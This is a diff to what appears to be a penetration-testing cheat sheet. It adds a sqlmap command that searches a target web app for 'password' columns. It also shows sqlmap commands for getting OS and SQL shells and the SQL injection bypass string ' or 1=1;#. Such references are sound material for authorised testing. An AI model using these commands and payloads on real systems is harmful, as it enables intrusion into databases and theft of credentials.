@@ -209,7 +209,9 @@ SQLMap
 - SQLMap Shell:  
   `sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell` 
 - SQL Shell through UNION based SQL Injection in "TextBoxUsername" field:  
-  `sqlmap -r request.txt -p TextBoxUsername --sql-shell --technique=U` 
+  `sqlmap -r request.txt -p TextBoxUsername --sql-shell --technique=U`  
+- Search for columns with the name password   
+  `python sqlmap.py -u "http://192.168.1.1/mypath/mypoorlywrittenapp.asp?SessionID=" --time-sec=1 --search -C 'password'`  
 
 Bypasses  
   `' or 1=1;#`  (MySQL/MariaDB)
